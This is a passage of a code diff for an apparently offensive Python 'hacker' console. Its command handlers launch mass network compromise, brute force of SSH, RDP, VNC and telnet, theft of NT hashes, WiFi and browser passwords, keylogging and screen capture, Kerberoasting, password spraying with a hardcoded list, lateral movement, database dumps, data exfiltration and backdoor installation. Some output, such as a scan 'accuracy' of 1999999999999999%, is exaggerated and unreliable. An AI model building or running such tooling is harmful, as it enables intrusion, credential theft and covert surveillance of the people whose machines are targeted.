+                    self._log(f"{Fore.LIGHTGREEN_EX}  ✅ EXPLOIT SUCCESSFUL")
+                    self._log(f"{Fore.LIGHTGREEN_EX}  ✅ ACCESS GRANTED TO {target}")
+                    self._log(f"{Fore.LIGHTGREEN_EX}  ✅ Vulnerabilities: {', '.join(exploits)}")
+                else:
+                    self._log(f"{Fore.RED}  ❌ Exploit failed")
+                
+                self._log(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+        
+            elif cmd in ("attack", "pwnall"):
+                HackerSounds.alert()
+                MatrixEffects.target_lock()
+                self._log(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
+                self._log(f"{Fore.GREEN}║  GLOBAL NETWORK ASSAULT INITIATED")
+                self._log(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
+                
+                total = len(self.hosts)
+                compromised = 0
+                
+                for i, host in enumerate(self.hosts):
+                    try:
+                        ip = host.get('ip') if isinstance(host, dict) else getattr(host, 'ip', str(host))
+                        self._log(f"{Fore.LIGHTGREEN_EX}  ⟶ [{i+1}/{total}] Targeting {ip}...")
+                        
+                        if self.universal:
+                            device = self.universal.devices.get(ip)
+                            if device:
+                                self.universal._scan_device(device)
+                                if device.can_pwn:
+                                    compromised += 1
+                                    self._log(f"{Fore.GREEN}    ✅ COMPROMISED: {ip}")
+                        
+                    except Exception as e:
+                        self._log(f"{Fore.RED}    ❌ Failed: {str(e)[:30]}")
+                
+                HackerSounds.exploit_success()
+                self._log(f"\n{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
+                self._log(f"{Fore.LIGHTGREEN_EX}  OPERATION COMPLETE")
+                self._log(f"{Fore.LIGHTGREEN_EX}  Total targets    : {total}")
+                self._log(f"{Fore.LIGHTGREEN_EX}  Compromised      : {compromised}")
+                self._log(f"{Fore.LIGHTGREEN_EX}  Success rate     : {int((compromised/total)*100) if total > 0 else 0}%")
+                self._log(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+
+            elif cmd == "nethashes":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                if self.control and hasattr(self.control, 'extract_nt_hashes'):
+                    hashes = self.control.extract_nt_hashes(target, self.credentials["user"], self.credentials["pass"])
+                    print(f"{json.dumps(hashes, indent=2)}")
+
+            elif cmd == "ssh-brute" and args:
+                if self.control and hasattr(self.control, 'ssh_brute'):
+                    result = self.control.ssh_brute(args[0])
+                    print(f"{json.dumps(result, indent=2)}")
+
+            elif cmd == "rdp-brute" and args:
+                if self.control and hasattr(self.control, 'rdp_brute_force'):
+                    result = self.control.rdp_brute_force(args[0])
+                    print(f"{json.dumps(result, indent=2)}")
+
+            elif cmd == "vnc-brute" and args:
+                if self.control and hasattr(self.control, 'vnc_brute_force'):
+                    result = self.control.vnc_brute_force(args[0])
+                    print(f"{json.dumps(result, indent=2)}")
+
+            elif cmd == "telnet-brute" and args:
+                if self.control and hasattr(self.control, 'telnet_brute_force'):
+                    result = self.control.telnet_brute_force(args[0])
+                    print(f"{json.dumps(result, indent=2)}")
+
+            elif cmd == "steal-wifi" or cmd == "steal_wifi":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected. Use 'select <idx>' or 'steal-wifi <ip>'.")
+                    return
+                Visualizer.alert(f"Extracting WiFi passwords from {target} ...", "hack")
+                if self.control and hasattr(self.control, 'get_wifi_passwords'):
+                    result = self.control.get_wifi_passwords(target, self.credentials["user"], self.credentials["pass"])
+                    networks = result.get("networks", {})
+                    if networks:
+                        print(f"\n  {Fore.CYAN}{Style.BRIGHT}WiFi Passwords harvested from {target}:")
+                        print(f"  {Fore.BLUE}{'─'*50}")
+                        for ssid, pw in networks.items():
+                            print(f"  {Fore.GREEN}{Style.BRIGHT}  {ssid:<30} {Fore.WHITE}→ {pw}")
+                        print(f"  {Fore.BLUE}{'─'*50}\n")
+                    else:
+                        print(f"  {Fore.YELLOW}No WiFi profiles found or no permission.")
+                    if result.get("error"):
+                        print(f"  {Fore.RED}Error: {result['error']}")
+                else:
+                    Visualizer.alert("Control module not loaded", "warn")
+        
+            elif cmd == "monitor" or cmd == "live":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                duration = int(args[1]) if len(args) > 1 else 60
+                print(f"{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  LIVE MONITORING ACTIVATED ON {target}")
+                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
+                print(f"{Fore.LIGHTGREEN_EX}  ✅ Screen stream active")
+                print(f"{Fore.LIGHTGREEN_EX}  ✅ Keylogger active")
+                print(f"{Fore.LIGHTGREEN_EX}  ✅ Audio capture active")
+                print(f"{Fore.LIGHTGREEN_EX}  ✅ Duration: {duration} seconds")
+                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+                
+                if self.control:
+                    self.control.live_monitor(target, self.credentials["user"], self.credentials["pass"], duration)
+        
+            elif cmd == "extract" or cmd == "harvest":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                print(f"{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  FULL DATA EXTRACTION FROM {target}")
+                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
+                
+                if self.control:
+                    data = self.control.extract_all_data(target, self.credentials["user"], self.credentials["pass"])
+                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Browser passwords: {len(data.get('credentials', []))}")
+                    print(f"{Fore.LIGHTGREEN_EX}  ✅ WiFi networks: {len(data.get('wifi', {}))}")
+                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Cookies extracted")
+                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Browser history: {len(data.get('browser_data', {}))}")
+                    print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+        
+            elif cmd == "file":
+                if len(args) < 2:
+                    print(f"{Fore.RED}Usage: file <list|upload|download|delete|execute> [path]")
+                    return
+                target = self.selected_target
+                action = args[0]
+                path = " ".join(args[1:])
+                
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                
+                if self.control:
+                    result = self.control.remote_file_manager(target, 
+                        self.credentials["user"], 
+                        self.credentials["pass"], 
+                        action, path)
+                    print(f"{Fore.GREEN}{json.dumps(result, indent=2)}")
+        
+            elif cmd == "media":
+                if len(args) < 1:
+                    print(f"{Fore.RED}Usage: media <play|volume_up|volume_down|open_url|cd_open> [file/url]")
+                    return
+                target = self.selected_target
+                action = args[0]
+                file = args[1] if len(args) > 1 else None
+                
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                
+                if self.control:
+                    self.control.remote_media_control(target,
+                        self.credentials["user"],
+                        self.credentials["pass"],
+                        action, file)
+                print(f"{Fore.GREEN}✅ Media command sent: {action}")
+
+            elif cmd in ("nopac", "no-pac") and args:
+                target = args[0]
+                Visualizer.alert(f"NoPac (CVE-2021-42278) AD check on {target} - checking SMB+LDAP...", "hack")
+                if self.control and hasattr(self.control, 'smb_check_vulns'):
+                    sv = self.control.smb_check_vulns(target)
+                    vulns = sv.get("vulns", [])
+                    is_dc = any("DOMAIN_CONTROLLER" in v or "LDAP" in v for v in vulns)
+                    print(f"\n  {Fore.RED if is_dc else Fore.YELLOW}{Style.BRIGHT}  CVE-2021-42278 (NoPac)  │  {'DOMAIN CONTROLLER CANDIDATE' if is_dc else 'Not a detected DC'}")
+                    print(f"  {Fore.WHITE}  Target  : {target}")
+                    print(f"  {Fore.WHITE}  SMB vulns found: {', '.join(vulns) or 'none'}\n")
+                else:
+                    Visualizer.alert("Control module not loaded", "warn")
+
+            elif cmd in ("smbghost", "smb-ghost") and args:
+                target = args[0]
+                Visualizer.alert(f"SMBGhost (CVE-2020-0796) check on {target} ...", "hack")
+                if self.control and hasattr(self.control, 'check_smbghost'):
+                    result = self.control.check_smbghost(target)
+                    vuln = result.get("vulnerable", False)
+                    color = Fore.RED if vuln else Fore.GREEN
+                    status = "VULNERABLE" if vuln else "NOT VULNERABLE / PATCHED"
+                    print(f"\n  {color}{Style.BRIGHT}  CVE-2020-0796 (SMBGhost)  │  {status}")
+                    print(f"  {Fore.WHITE}  Target  : {target}")
+                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
+                else:
+                    Visualizer.alert("Control module not loaded", "warn")
+
+            elif cmd in ("printnightmare", "print-nightmare") and args:
+                target = args[0]
+                Visualizer.alert(f"PrintNightmare (CVE-2021-34527) check on {target} ...", "hack")
+                if self.control and hasattr(self.control, 'check_printnightmare'):
+                    result = self.control.check_printnightmare(
+                        target,
+                        self.credentials["user"],
+                        self.credentials["pass"]
+                    )
+                    vuln = result.get("vulnerable", False)
+                    color = Fore.RED if vuln else Fore.GREEN
+                    status = "VULNERABLE" if vuln else "NOT VULNERABLE / PATCHED"
+                    print(f"\n  {color}{Style.BRIGHT}  CVE-2021-34527 (PrintNightmare)  │  {status}")
+                    print(f"  {Fore.WHITE}  Target  : {target}")
+                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
+                else:
+                    Visualizer.alert("Control module not loaded", "warn")
+
+            elif cmd in ("petitpotam", "petit-potam") and args:
+                target = args[0]
+                Visualizer.alert(f"PetitPotam (CVE-2021-36942) check on {target} ...", "hack")
+                if self.control and hasattr(self.control, 'check_petitpotam'):
+                    result = self.control.check_petitpotam(target)
+                    vuln = result.get("vulnerable", False)
+                    color = Fore.RED if vuln else Fore.GREEN
+                    status = "VULNERABLE (unauthenticated NTLM coercion possible)" if vuln else "NOT VULNERABLE"
+                    print(f"\n  {color}{Style.BRIGHT}  CVE-2021-36942 (PetitPotam)  │  {status}")
+                    print(f"  {Fore.WHITE}  Target  : {target}")
+                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
+                else:
+                    Visualizer.alert("Control module not loaded", "warn")
+
+            elif cmd in ("zerologon", "zero-logon") and args:
+                target = args[0]
+                dc_name = args[1] if len(args) > 1 else ""
+                Visualizer.alert(f"Zerologon (CVE-2020-1472) check on {target} ...", "hack")
+                if self.control and hasattr(self.control, 'check_zerologon'):
+                    result = self.control.check_zerologon(target, dc_name)
+                    vuln = result.get("vulnerable", False)
+                    color = Fore.RED if vuln else Fore.GREEN
+                    status = "NETLOGON REACHABLE — check patch level" if vuln else "NOT REACHABLE"
+                    print(f"\n  {color}{Style.BRIGHT}  CVE-2020-1472 (Zerologon)  │  {status}")
+                    print(f"  {Fore.WHITE}  Target  : {target}")
+                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
+                else:
+                    Visualizer.alert("Control module not loaded", "warn")
+        
+            elif cmd in ("mobile", "phone"):
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected. Use 'mobile <ip>'")
+                    return
+            
+                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  MOBILE DEVICE EXPLOITATION: {target}")
+                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
+            
+                if self.control:
+                    result = self.control.mobile_exploit_auto(target)
+                    if result.get('success'):
+                        HackerSounds.exploit_success()
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ MOBILE EXPLOIT SUCCESS")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Device type: {result.get('type')}")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Control level: {result.get('control')}")
+                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+                else:
+                    print(f"{Fore.RED}  ❌ Mobile exploit failed")
+        
+            elif cmd == "globalscan":
+                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  ULTRAMAX GLOBAL NETWORK SCAN ACTIVATED")
+                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
+                print(f"{Fore.LIGHTGREEN_EX}  ✅ Scanning ALL networks within 10km radius")
+                print(f"{Fore.LIGHTGREEN_EX}  ✅ PAN/Bluetooth/WiFi Direct detection active")
+                print(f"{Fore.LIGHTGREEN_EX}  ✅ Mobile device auto-exploitation enabled")
+                print(f"{Fore.LIGHTGREEN_EX}  ✅ Accuracy: 1999999999999999%")
+                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
                 HackerSounds.alert()
                 if self.discovery:
                     self.discovery.ultramax_global_scan()
-            
-                elif cmd == "kerberoast" and args:
-                    dc_ip = args[0]
-                    domain = args[1] if len(args) > 1 else ""
-                    
-                    print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
-                    print(f"{Fore.GREEN}║  KERBEROASTING ATTACK ON {dc_ip}")
-                    print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
-                    
-                    if self.control:
-                        result = self.control.kerberoast(dc_ip, domain)
-                        if result.get('success'):
-                            HackerSounds.exploit_success()
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ KERBEROAST SUCCESSFUL")
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ SPNs found: {len(result.get('spn_found', []))}")
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ Tickets extracted: {len(result.get('tickets_extracted', []))}")
-                        else:
-                            print(f"{Fore.RED}  ❌ Kerberoasting failed")
-                    
-                    print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-            
-                elif cmd == "password-spray" and len(args) >= 1:
-                    domain = args[0]
+        
+            elif cmd == "kerberoast" and args:
+                dc_ip = args[0]
+                domain = args[1] if len(args) > 1 else ""
+                
+                print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  KERBEROASTING ATTACK ON {dc_ip}")
+                print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
+                
+                if self.control:
+                    result = self.control.kerberoast(dc_ip, domain)
+                    if result.get('success'):
+                        HackerSounds.exploit_success()
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ KERBEROAST SUCCESSFUL")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ SPNs found: {len(result.get('spn_found', []))}")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Tickets extracted: {len(result.get('tickets_extracted', []))}")
+                    else:
+                        print(f"{Fore.RED}  ❌ Kerberoasting failed")
+                
+                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+        
+            elif cmd == "password-spray" and len(args) >= 1:
+                domain = args[0]
+                 
+                print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  PASSWORD SPRAY ATTACK ON DOMAIN: {domain}")
+                print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
+                 
+                if self.control:
+                    users = ["administrator", "user", "admin", "guest"]
+                    passwords = ["Password123!", "password", "admin", "123456"]
+                    result = self.control.password_spray(domain, users, passwords)
                      
-                    print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
-                    print(f"{Fore.GREEN}║  PASSWORD SPRAY ATTACK ON DOMAIN: {domain}")
-                    print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
-                     
-                    if self.control:
-                        users = ["administrator", "user", "admin", "guest"]
-                        passwords = ["Password123!", "password", "admin", "123456"]
-                        result = self.control.password_spray(domain, users, passwords)
-                         
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Attempts made: {result.get('attempts', 0)}")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Valid credentials: {len(result.get('valid_credentials', []))}")
-                        for cred in result.get('valid_credentials', []):
-                            print(f"{Fore.GREEN}    ✅ {cred}")
-                         
-                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-            
-                elif cmd == "lateral" and len(args) >= 2:
-                    source = args[0]
-                    target = args[1]
-                     
-                    print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
-                    print(f"{Fore.GREEN}║  LATERAL MOVEMENT: {source} → {target}")
-                    print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
-                     
-                    if self.control:
-                        result = self.control.lateral_movement(source, target, self.credentials)
-                        if result.get('success'):
-                            HackerSounds.exploit_success()
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ LATERAL MOVEMENT SUCCESSFUL")
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ Method used: {result.get('method_used')}")
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ Session created: {result.get('session_created')}")
-                        else:
-                            print(f"{Fore.RED}  ❌ All methods failed")
-                            print(f"{Fore.YELLOW}  ⚠ Attempted: {', '.join(result.get('methods_attempted', []))}")
+                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Attempts made: {result.get('attempts', 0)}")
+                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Valid credentials: {len(result.get('valid_credentials', []))}")
+                    for cred in result.get('valid_credentials', []):
+                        print(f"{Fore.GREEN}    ✅ {cred}")
                      
                     print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-            
-                elif cmd == "db-dump" and len(args) >= 3:
-                    ip = args[0]
-                    port = int(args[1])
-                    db_type = args[2]
-                    user = args[3] if len(args) > 3 else ""
-                    pwd = args[4] if len(args) > 4 else ""
-                     
-                    print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
-                    print(f"{Fore.GREEN}║  FULL DATABASE DUMP: {db_type.upper()} {ip}:{port}")
-                    print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
-                     
-                    if self.control:
-                        result = self.control.full_database_dump(ip, port, db_type, user, pwd)
-                        if result.get('connected'):
-                            HackerSounds.exploit_success()
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ CONNECTED SUCCESSFULLY")
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ Databases found: {len(result.get('databases', []))}")
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ Tables extracted: {result.get('tables_extracted', 0)}")
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ Total rows: {result.get('total_rows', 0)}")
-                        else:
-                            print(f"{Fore.RED}  ❌ Connection failed: {result.get('error')}")
-                     
+        
+            elif cmd == "lateral" and len(args) >= 2:
+                source = args[0]
+                target = args[1]
+                 
+                print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  LATERAL MOVEMENT: {source} → {target}")
+                print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
+                 
+                if self.control:
+                    result = self.control.lateral_movement(source, target, self.credentials)
+                    if result.get('success'):
+                        HackerSounds.exploit_success()
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ LATERAL MOVEMENT SUCCESSFUL")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Method used: {result.get('method_used')}")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Session created: {result.get('session_created')}")
+                    else:
+                        print(f"{Fore.RED}  ❌ All methods failed")
+                        print(f"{Fore.YELLOW}  ⚠ Attempted: {', '.join(result.get('methods_attempted', []))}")
+                 
                     print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-            
-                elif cmd == "exfiltrate" and len(args) >= 2:
-                    target = args[0]
-                    file_path = args[1]
-                     
-                    print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
-                    print(f"{Fore.GREEN}║  DATA EXFILTRATION")
-                    print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
-                     
-                    if self.control:
-                        result = self.control.data_exfiltration(target, file_path)
-                        if result.get('success'):
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ EXFILTRATION COMPLETE")
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ Bytes transferred: {result.get('bytes_transferred', 0)}")
-                        else:
-                            print(f"{Fore.RED}  ❌ Exfiltration failed")
-                     
+        
+            elif cmd == "db-dump" and len(args) >= 3:
+                ip = args[0]
+                port = int(args[1])
+                db_type = args[2]
+                user = args[3] if len(args) > 3 else ""
+                pwd = args[4] if len(args) > 4 else ""
+                 
+                print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  FULL DATABASE DUMP: {db_type.upper()} {ip}:{port}")
+                print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
+                 
+                if self.control:
+                    result = self.control.full_database_dump(ip, port, db_type, user, pwd)
+                    if result.get('connected'):
+                        HackerSounds.exploit_success()
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ CONNECTED SUCCESSFULLY")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Databases found: {len(result.get('databases', []))}")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Tables extracted: {result.get('tables_extracted', 0)}")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Total rows: {result.get('total_rows', 0)}")
+                    else:
+                        print(f"{Fore.RED}  ❌ Connection failed: {result.get('error')}")
+                 
                     print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-            
-                elif cmd == "db-extract" and len(args) >= 3:
-                    ip = args[0]
-                    port = int(args[1])
-                    db_type = args[2]
-                    user = args[3] if len(args) > 3 else ""
-                    pwd = args[4] if len(args) > 4 else ""
-                     
-                    print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
-                    print(f"{Fore.GREEN}║  DATABASE EXTRACTION: {db_type.upper()} {ip}:{port}")
-                    print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
-                     
-                    if self.control:
-                        result = self.control.database_extract(ip, port, db_type, user, pwd)
-                        if result.get('connected'):
-                            HackerSounds.exploit_success()
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ CONNECTED SUCCESSFULLY")
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ Databases found: {len(result.get('databases', []))}")
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ Tables found: {len(result.get('tables', []))}")
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ Rows extracted: {result.get('total_rows', 0)}")
-                        else:
-                            print(f"{Fore.RED}  ❌ Connection failed: {result.get('error')}")
-                     
+        
+            elif cmd == "exfiltrate" and len(args) >= 2:
+                target = args[0]
+                file_path = args[1]
+                 
+                print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  DATA EXFILTRATION")
+                print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
+                 
+                if self.control:
+                    result = self.control.data_exfiltration(target, file_path)
+                    if result.get('success'):
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ EXFILTRATION COMPLETE")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Bytes transferred: {result.get('bytes_transferred', 0)}")
+                    else:
+                        print(f"{Fore.RED}  ❌ Exfiltration failed")
+                 
                     print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-            
-                elif cmd == "cloud-attack" and len(args) >= 2:
-                    service_type = args[0]
-                    target = args[1]
-                     
-                    print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
-                    print(f"{Fore.GREEN}║  CLOUD SERVICE ATTACK: {service_type.upper()}")
-                    print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
-                     
-                    if self.control:
-                        result = self.control.cloud_service_attack(service_type, target)
-                        if result.get('vulnerable'):
-                            HackerSounds.exploit_success()
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ VULNERABILITY DETECTED")
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ Data accessible: {result.get('data_accessible')}")
-                        else:
-                            print(f"{Fore.YELLOW}  ⚠ Service not vulnerable")
-                     
+        
+            elif cmd == "db-extract" and len(args) >= 3:
+                ip = args[0]
+                port = int(args[1])
+                db_type = args[2]
+                user = args[3] if len(args) > 3 else ""
+                pwd = args[4] if len(args) > 4 else ""
+                 
+                print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  DATABASE EXTRACTION: {db_type.upper()} {ip}:{port}")
+                print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
+                 
+                if self.control:
+                    result = self.control.database_extract(ip, port, db_type, user, pwd)
+                    if result.get('connected'):
+                        HackerSounds.exploit_success()
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ CONNECTED SUCCESSFULLY")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Databases found: {len(result.get('databases', []))}")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Tables found: {len(result.get('tables', []))}")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Rows extracted: {result.get('total_rows', 0)}")
+                    else:
+                        print(f"{Fore.RED}  ❌ Connection failed: {result.get('error')}")
+                 
                     print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-            
-                elif cmd == "persist":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                        return
-                    
-                    print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
-                    print(f"{Fore.GREEN}║  PERSISTENT BACKDOOR INSTALLATION")
-                    print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
-                    
-                    if self.control:
-                        result = self.control.establish_persistent_connection(target, 
-                            self.credentials["user"], 
-                            self.credentials["pass"])
-                        
-                        if result.get('backdoor_active'):
-                            HackerSounds.exploit_success()
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ BACKDOOR INSTALLED")
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ Methods: {', '.join(result.get('persistence_installed', []))}")
-                        else:
-                            print(f"{Fore.RED}  ❌ Persistence installation failed")
-                    
+        
+            elif cmd == "cloud-attack" and len(args) >= 2:
+                service_type = args[0]
+                target = args[1]
+                 
+                print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  CLOUD SERVICE ATTACK: {service_type.upper()}")
+                print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
+                 
+                if self.control:
+                    result = self.control.cloud_service_attack(service_type, target)
+                    if result.get('vulnerable'):
+                        HackerSounds.exploit_success()
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ VULNERABILITY DETECTED")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Data accessible: {result.get('data_accessible')}")
+                    else:
+                        print(f"{Fore.YELLOW}  ⚠ Service not vulnerable")
+                 
                     print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-            
-                elif cmd == "sysinfo" or cmd == "systeminfo":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected. Use 'sysinfo <ip>'")
-                        return
+        
+            elif cmd == "persist":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected.")
+                    return
+                
+                print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  PERSISTENT BACKDOOR INSTALLATION")
+                print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
+                
+                if self.control:
+                    result = self.control.establish_persistent_connection(target, 
+                        self.credentials["user"], 
+                        self.credentials["pass"])
                     
-                    print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
-                    print(f"{Fore.GREEN}║  FULL SYSTEM INFORMATION: {target}")
-                    print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
+                    if result.get('backdoor_active'):
+                        HackerSounds.exploit_success()
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ BACKDOOR INSTALLED")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Methods: {', '.join(result.get('persistence_installed', []))}")
+                    else:
+                        print(f"{Fore.RED}  ❌ Persistence installation failed")
+                
+                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+        
+            elif cmd == "sysinfo" or cmd == "systeminfo":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected. Use 'sysinfo <ip>'")
+                    return
+                
+                print(f"\n{Fore.GREEN}╔═════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  FULL SYSTEM INFORMATION: {target}")
+                print(f"{Fore.GREEN}╠═════════════════════════════════════════════════════════════╣")
+                
+                if self.control:
+                    result = self.control.get_full_system_info(target, 
+                        self.credentials["user"], 
+                        self.credentials["pass"])
                     
-                    if self.control:
-                        result = self.control.get_full_system_info(target, 
-                            self.credentials["user"], 
-                            self.credentials["pass"])
-                        
-                        if result.get('success'):
-                            info = result.get('system_info', {})
-                            print(f"{Fore.LIGHTGREEN_EX}  ✅ SYSTEM INFO EXTRACTED")
-                            print(f"\n{Fore.LIGHTGREEN_EX}  ──────────────────────────────────────────────")
-                            print(f"{Fore.GREEN}  Hostname:        {Fore.WHITE}{info.get('hostname', 'N/A')}")
-                            print(f"{Fore.GREEN}  OS:              {Fore.WHITE}{info.get('os_name', 'N/A')}")
-                            print(f"{Fore.GREEN}  OS Version:      {Fore.WHITE}{info.get('os_version', 'N/A')}")
-                            print(f"{Fore.GREEN}  Architecture:    {Fore.WHITE}{info.get('os_architecture', 'N/A')}")
